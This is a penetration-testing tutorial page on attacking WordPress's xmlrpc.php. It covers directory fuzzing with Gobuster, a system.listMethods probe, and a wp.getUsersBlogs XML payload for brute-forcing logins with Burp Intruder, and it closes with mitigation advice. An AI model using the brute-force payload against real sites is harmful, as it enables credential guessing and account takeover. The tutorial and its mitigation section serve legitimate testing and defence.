---
description: >-
  Information discloure and other attacks through WordPress xmlrpc.php
  vulnerability
---

# WordPress xmlrpc.php

## Summary

`xmlrpc.php` is essentially an API (Application Programming Interface) for WordPress which allows users to interact with their WordPress site. Although `xmlrpc.php` is largely outdated, it is still used in WordPress to provide backward compatibility. One of the main security vulnerabilities on `xmlrpc.php` is that it sends authentication information with every request. Thus, an attacker can use this to extract login credentials.

## Versions

* All WordPress sites running version 3.5 and above (`xmlrpc.php` is enabled by default)
* WordPress sites which have `xmlrpc` enabled

## Exploitation

### Finding xmlrpc.php

The exact path to `xmlrpc.php` can be found by fuzzing active WordPress directories or by fuzzing specifically for `.php` extensions. Here is an example of `xmlrpc.php` showing up in Gobuster directory fuzz.

{% code overflow="wrap" %}
```bash
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://10.13.37.11 --wordlist /usr/share/dirb/wordlists/common.txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.13.37.11
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/12/01 07:32:36 Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 276]
/.hta                 (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/backups              (Status: 301) [Size: 312] [--> http://10.13.37.11/backups/]
/dev                  (Status: 301) [Size: 308] [--> http://10.13.37.11/dev/]
/index.php            (Status: 301) [Size: 0] [--> http://10.13.37.11/]
/javascript           (Status: 301) [Size: 315] [--> http://10.13.37.11/javascript/]
/scripts              (Status: 401) [Size: 458]
/server-status        (Status: 403) [Size: 276]
/wp-admin             (Status: 301) [Size: 313] [--> http://10.13.37.11/wp-admin/]
/wp-content           (Status: 301) [Size: 315] [--> http://10.13.37.11/wp-content/]
/wp-includes          (Status: 301) [Size: 316] [--> http://10.13.37.11/wp-includes/]
/xmlrpc.php           (Status: 405) [Size: 42]
Progress: 4614 / 4615 (99.98%)
===============================================================
2023/12/01 07:34:02 Finished
===============================================================
```
{% endcode %}

### Exploiting xmlrpc.php

First step in exploiting `xmlrpc.php` is to make sure the current settings for this page are indeed vulnerable. To do this, send a `POST` request to `xmlrpc.php` with the following payload.

{% code overflow="wrap" %}
```xml
<methodCall> 
<methodName>system.listMethods</methodName> 
<params></params> 
</methodCall>
```
{% endcode %}

If the response resembles the following, the page is indeed vulnerable. If not, then the page is not vulnerable and the exploit will not work.

{% code overflow="wrap" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <params>
    <param>
      <value>
      <array><data>
  <value><string>system.multicall</string></value>
  <value><string>system.listMethods</string></value>
  <value><string>system.getCapabilities</string></value>
  <value><string>demo.addTwoNumbers</string></value>
  <value><string>demo.sayHello</string></value>
  <value><string>pingback.extensions.getPingbacks</string></value>
  <value><string>pingback.ping</string></value>
  <value><string>mt.publishPost</string></value>
  <value><string>mt.getTrackbackPings</string></value>
  <value><string>mt.supportedTextFilters</string></value>
  <value><string>mt.supportedMethods</string></value>
  <value><string>mt.setPostCategories</string></value>
  <value><string>mt.getPostCategories</string></value>
  <value><string>mt.getRecentPostTitles</string></value>
  <value><string>mt.getCategoryList</string></value>
  <value><string>metaWeblog.getUsersBlogs</string></value>
  <value><string>metaWeblog.deletePost</string></value>
  <value><string>metaWeblog.newMediaObject</string></value>
  <value><string>metaWeblog.getCategories</string></value>
  <value><string>metaWeblog.getRecentPosts</string></value>
  <value><string>metaWeblog.getPost</string></value>
  <value><string>metaWeblog.editPost</string></value>
  <value><string>metaWeblog.newPost</string></value>
  <value><string>blogger.deletePost</string></value>
  <value><string>blogger.editPost</string></value>
  <value><string>blogger.newPost</string></value>
  <value><string>blogger.getRecentPosts</string></value>
  <value><string>blogger.getPost</string></value>
  <value><string>blogger.getUserInfo</string></value>
  <value><string>blogger.getUsersBlogs</string></value>
  <value><string>wp.restoreRevision</string></value>
  <value><string>wp.getRevisions</string></value>
  <value><string>wp.getPostTypes</string></value>
  <value><string>wp.getPostType</string></value>
  <value><string>wp.getPostFormats</string></value>
  <value><string>wp.getMediaLibrary</string></value>
  <value><string>wp.getMediaItem</string></value>
  <value><string>wp.getCommentStatusList</string></value>
  <value><string>wp.newComment</string></value>
  <value><string>wp.editComment</string></value>
  <value><string>wp.deleteComment</string></value>
  <value><string>wp.getComments</string></value>
  <value><string>wp.getComment</string></value>
  <value><string>wp.setOptions</string></value>
  <value><string>wp.getOptions</string></value>
  <value><string>wp.getPageTemplates</string></value>
  <value><string>wp.getPageStatusList</string></value>
  <value><string>wp.getPostStatusList</string></value>
  <value><string>wp.getCommentCount</string></value>
  <value><string>wp.deleteFile</string></value>
  <value><string>wp.uploadFile</string></value>
  <value><string>wp.suggestCategories</string></value>
  <value><string>wp.deleteCategory</string></value>
  <value><string>wp.newCategory</string></value>
  <value><string>wp.getTags</string></value>
  <value><string>wp.getCategories</string></value>
  <value><string>wp.getAuthors</string></value>
  <value><string>wp.getPageList</string></value>
  <value><string>wp.editPage</string></value>
  <value><string>wp.deletePage</string></value>
  <value><string>wp.newPage</string></value>
  <value><string>wp.getPages</string></value>
  <value><string>wp.getPage</string></value>
  <value><string>wp.editProfile</string></value>
  <value><string>wp.getProfile</string></value>
  <value><string>wp.getUsers</string></value>
  <value><string>wp.getUser</string></value>
  <value><string>wp.getTaxonomies</string></value>
  <value><string>wp.getTaxonomy</string></value>
  <value><string>wp.getTerms</string></value>
  <value><string>wp.getTerm</string></value>
  <value><string>wp.deleteTerm</string></value>
  <value><string>wp.editTerm</string></value>
  <value><string>wp.newTerm</string></value>
  <value><string>wp.getPosts</string></value>
  <value><string>wp.getPost</string></value>
  <value><string>wp.deletePost</string></value>
  <value><string>wp.editPost</string></value>
  <value><string>wp.newPost</string></value>
  <value><string>wp.getUsersBlogs</string></value>
</data></array>
      </value>
    </param>
  </params>
</methodResponse>
```
{% endcode %}

If the page is vulnerable, then we can interact with the most basic method `demo.sayHello`:

{% code overflow="wrap" %}
```xml
<methodCall> 
<methodName>demo.sayHello</methodName> 
<params></params> 
</methodCall>
```
{% endcode %}

The response:

{% code overflow="wrap" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <params>
    <param>
      <value>
      <string>Hello!</string>
      </value>
    </param>
  </params>
</methodResponse>
```
{% endcode %}

### Brute Forcing Credentials

The following payload can be used with Burp intruder to look for possible credentials.

{% code overflow="wrap" %}
```xml
<methodCall> 
<methodName>wp.getUsersBlogs</methodName> 
<params> 
<param><value>username</value></param> 
<param><value>password</value></param> 
</params> 
</methodCall>
```
{% endcode %}

{% hint style="info" %}
**Note:** In the Burp intruder attack, the response code will always be 200. Hence, it is recommended to look for possible information response size/headers or error messages in the response to find an actual workable credential.
{% endhint %}

## Mitigation

To protect your WordPress site, `xmlrpc.php` can be disabled with a simple WordPress plugin called [Disable XML-RPC](https://wordpress.org/plugins/disable-xml-rpc/). Another method is to disable `xmlrpc.php` in the `.htaccess` file with the following code.

{% code overflow="wrap" %}
```apacheconf
<Files "xmlrpc.php">
  Require all denied
</Files>
```
{% endcode %}

## References:

{% embed url="https://the-bilal-rizwan.medium.com/wordpress-xmlrpc-php-common-vulnerabilites-how-to-exploit-them-d8d3c8600b32" %}

> Author: Shruti Priya
